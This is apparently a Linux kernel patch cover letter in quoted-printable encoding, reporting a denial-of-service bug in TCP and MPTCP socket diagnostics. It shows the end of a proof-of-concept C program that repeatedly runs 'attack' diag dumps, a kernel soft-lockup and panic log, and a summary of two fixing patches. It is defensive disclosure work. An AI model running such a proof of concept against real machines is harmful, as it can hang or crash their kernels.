		if (run_dump(opts.listen_mode, false, 0, &wall_ms) < 0) {=0D
			teardown_sockets(fds, opts.groups * opts.sockets);=0D
			return 1;=0D
		}=0D
		printf("baseline wall_ms=3D%.3f\n", wall_ms);=0D
	}=0D
=0D
	if (opts.attack) {=0D
		for (i =3D 0; i < opts.repeat; i++) {=0D
			double wall_ms;=0D
=0D
			if (run_dump(opts.listen_mode, true, opts.nops, &wall_ms) < 0) {=0D
				teardown_sockets(fds, opts.groups * opts.sockets);=0D
				return 1;=0D
			}=0D
			printf("attack_run=3D%u wall_ms=3D%.3f\n", i + 1, wall_ms);=0D
		}=0D
	}=0D
=0D
	teardown_sockets(fds, opts.groups * opts.sockets);=0D
	return 0;=0D
}=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
[   18.495442] watchdog: BUG: soft lockup - CPU#0 stuck for 3s! [poc:1034]=
=0D
[   18.495442] Modules linked in:=0D
[   18.495442] irq event stamp: 1545=0D
[   18.495442] hardirqs last  enabled at (1544): [<ffffffff81ae73a9>] conso=
le_unlock+0x5a9/0x730=0D
[   18.495442] hardirqs last disabled at (1545): [<ffffffff81ae695e>] conso=
le_unlock+0x35e/0x730=0D
[   18.495442] softirqs last  enabled at (1490): [<ffffffff8b61193e>] __irq=
_exit_rcu+0x8e/0x100=0D
[   18.495442] softirqs last disabled at (1485): [<ffffffff814a07a4>] __do_=
softirq+0x5a4/0x7f1=0D
[   18.495442] CPU#0 Utilization every 4s during lockup:=0D
[   18.495442]         #1: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #2: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #3: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #4: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #5: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442] CPU#0 Utilization every 5s during lockup:=0D
[   18.495442]         #1: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #2: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #3: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442] CPU#0 Utilization every 6s during lockup:=0D
[   18.495442]         #1: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442]         #2: 100% system,         0% softirq,         0% hard=
irq,         0% idle=0D
[   18.495442] Sending NMI from CPU 1 to CPUs 0:=0D
[   18.495449] NMI backtrace for cpu 0=0D
[   18.495449] CPU: 0 UID: 0 PID: 1034 Comm: poc Not tainted 7.2.0-rc4-0039=
0-g743916aa8e8c #5=0D
[   18.495449] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
unknown 2/2/2022=0D
[   18.495450] RIP: 0010:inet_diag_bc_sk+0xf2/0x390=0D
[   18.495451] Code: 89 df 49 8b 3c 24 e8 17 d0 b7 ff 49 8b 3c 24 4c 89 e6 =
4c 89 e2 49 8d ac 24 e0 00 00 00 e8 e0 d4 ff ff 84 c0 75 12 <4d> 8b 64 24 0=
8 49 8d 5c 24 10 e9 40 ff ff ff 41 80 3d 29 33 84=0D
[   18.495451] RSP: 0018:ffffc90003bcfc68 EFLAGS: 00000246=0D
[   18.495452] RAX: 0000000000000000 RBX: ffff8881071f0040 RCX: 00000000000=
00000=0D
[   18.495452] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff888106a=
4ce40=0D
[   18.495453] RBP: ffffc90003bcfd58 R08: 0000000000000000 R09: 00000000000=
00000=0D
[   18.495453] R10: ffffc90003bcfae8 R11: 0000000000000000 R12: ffffc90003b=
cfd20=0D
[   18.495453] R13: ffffffff8ae76d60 R14: ffffc90003bcfd20 R15: ffffc90003b=
cfd20=0D
[   18.495454] FS:  0000000000000000(0000) GS:ffff88846bc00000(0000) knlGS:=
0000000000000000=0D
[   18.495454] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033=0D
[   18.495455] CR2: 0000000000ad8000 CR3: 0000000107018000 CR4: 00000000003=
50ef0=0D
[   18.495455] Call Trace:=0D
[   18.495455]  <NMI>=0D
[   18.495456]  ? nmi_cpu_backtrace+0x16f/0x2a0=0D
[   18.495458]  ? nmi_trigger_cpumask_backtrace+0x242/0x350=0D
[   18.495459]  ? watchdog+0x3c2/0x480=0D
[   18.495461]  ? __pfx_watchdog+0x10/0x10=0D
[   18.495462]  ? __hrtimer_run_queues+0x1c5/0x4f0=0D
[   18.495464]  ? hrtimer_interrupt+0x337/0x7b0=0D
[   18.495465]  ? __sysvec_apic_timer_interrupt+0x5f/0x1d0=0D
[   18.495468]  ? sysvec_apic_timer_interrupt+0x4b/0xc0=0D
[   18.495470]  ? asm_sysvec_apic_timer_interrupt+0x1a/0x20=0D
[   18.495472]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495474]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495475]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495477]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495478]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495480]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495481]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495483]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495484]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495486]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495487]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495489]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495490]  ? inet_diag_bc_sk+0xf2/0x390=0D
[   18.495492]  ? inet_diag_bc_sk+0x12c/0x390=0D
[   18.495493]  ? lockdep_hardirqs_on_prepare+0xde/0x1b0=0D
[   18.495495]  ? console_unlock+0x5a9/0x730=0D
[   18.495497]  ? vprintk_emit+0x288/0x290=0D
[   18.495499]  ? __warn+0xee/0x1f0=0D
[   18.495501]  ? report_bug+0x216/0x530=0D
[   18.495504]  ? handle_bug+0x3c/0x70=0D
[   18.495506]  ? exc_invalid_op+0x17/0x70=0D
[   18.495508]  ? asm_exc_invalid_op+0x1a/0x20=0D
[   18.495509]  ? hrtimer_interrupt+0x28f/0x7b0=0D
[   18.495511]  ? __pfx_hrtimer_interrupt+0x10/0x10=0D
[   18.495513]  ? __sysvec_apic_timer_interrupt+0x5f/0x1d0=0D
[   18.495515]  ? sysvec_apic_timer_interrupt+0x4b/0xc0=0D
[   18.495516]  ? asm_sysvec_apic_timer_interrupt+0x1a/0x20=0D
[   18.495517]  </NMI>=0D
[   18.495518]  <TASK>=0D
[   18.495519]  ? __pfx_inet_diag_bc_sk+0x10/0x10=0D
[   18.495520]  ? __pfx_lock_acquire+0x10/0x10=0D
[   18.495522]  tcp_diag_dump+0x322/0x1240=0D
[   18.495524]  __inet_diag_dump+0x15c/0x280=0D
[   18.495526]  netlink_dump+0x4b4/0x7f0=0D
[   18.495529]  __netlink_dump_start+0x43b/0x5d0=0D
[   18.495531]  inet_diag_handler_cmd+0x2ee/0x420=0D
[   18.495533]  sock_diag_rcv_msg+0x255/0x300=0D
[   18.495535]  ? __pfx_sock_diag_rcv_msg+0x10/0x10=0D
[   18.495536]  netlink_rcv_skb+0x125/0x350=0D
[   18.495538]  sock_diag_rcv+0x31/0x40=0D
[   18.495540]  netlink_unicast+0x423/0x670=0D
[   18.495542]  netlink_sendmsg+0x73f/0xc20=0D
[   18.495543]  ? __pfx_netlink_sendmsg+0x10/0x10=0D
[   18.495545]  ? __pfx_lock_acquire+0x10/0x10=0D
[   18.495547]  ? __fget_light+0x205/0x250=0D
[   18.495549]  __sys_sendto+0x455/0x4f0=0D
[   18.495551]  ? __pfx___sys_sendto+0x10/0x10=0D
[   18.495553]  ? __pfx_lock_acquire+0x10/0x10=0D
[   18.495555]  __x64_sys_sendto+0xe5/0x120=0D
[   18.495556]  do_syscall_64+0x66/0x160=0D
[   18.495557]  ? __count_memcg_events+0x80/0x130=0D
[   18.495559]  ? clear_bhb_loop+0x35/0x90=0D
[   18.495561]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e=0D
[   18.495562]  entry_SYSCALL_64_after_hwframe+0x76/0x7e=0D
[   18.495563] RIP: 0033:0x421964=0D
[   18.495565] Code: 89 df 49 8b 3c 24 e8 17 d0 b7 ff 49 8b 3c 24 4c 89 e6 =
4c 89 e2 49 8d ac 24 e0 00 00 00 e8 e0 d4 ff ff 84 c0 75 12 <4d> 8b 64 24 0=
8 49 8d 5c 24 10 e9 40 ff ff ff 41 80 3d 29 33 84=0D
[   18.495567] RSP: 002b:00007ffde1d1cfc8 EFLAGS: 00000202 ORIG_RAX: 000000=
000000002e=0D
[   18.495568] RAX: ffffffffffffffda RBX: 0000000002bea910 RCX: 00000000004=
21964=0D
[   18.495570] RDX: 0000000000000000 RSI: 00007ffde1d1d040 RDI: 00000000000=
20003=0D
[   18.495571] RBP: 0000000000020003 R08: 0006b49d20000000 R09: 00007f62b3b=
b50e8=0D
[   18.495571] R10: 0000000000000004 R11: 0000000000000202 R12: 00007ffde1d=
1d110=0D
[   18.495571] R13: 0000000000003ffc R14: 0000000000010044 R15: 00000000000=
0fffc=0D
[   18.495572]  </TASK>=0D
[   18.495573] Kernel panic - not syncing: softlockup: hung tasks=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
=0D
=0D
=0D
Zihan Xi (2):=0D
  tcp: diag: fix unbounded bucket lock hold in tcp_diag_dump()=0D
  mptcp: diag: fix unbounded listener bucket lock hold=0D
=0D
 include/linux/inet_diag.h |  15 ++=0D
 net/ipv4/inet_diag.c      |  13 ++=0D
 net/ipv4/tcp_diag.c       | 316 +++++++++++++++++++++++++++-----------=0D
 net/mptcp/mptcp_diag.c    | 124 ++++++++++-----=0D
 4 files changed, 344 insertions(+), 124 deletions(-)=0D
=0D
-- =0D
2.43.0=0D
=0D
